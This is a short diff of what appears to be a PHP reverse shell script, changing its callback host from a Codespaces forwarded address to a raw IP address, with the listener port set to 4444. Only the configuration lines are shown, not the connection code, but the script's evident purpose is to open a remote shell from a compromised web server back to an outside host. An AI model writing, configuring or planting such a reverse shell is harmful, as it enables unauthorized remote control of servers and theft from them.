@@ -1,7 +1,7 @@
 <?php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = 'scaling-spoon-x557gjx6p7x7h9qq-4444.app.github.dev';  // CHANGE THIS
+$ip = '67.213.116.23';  // CHANGE THIS
 $port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
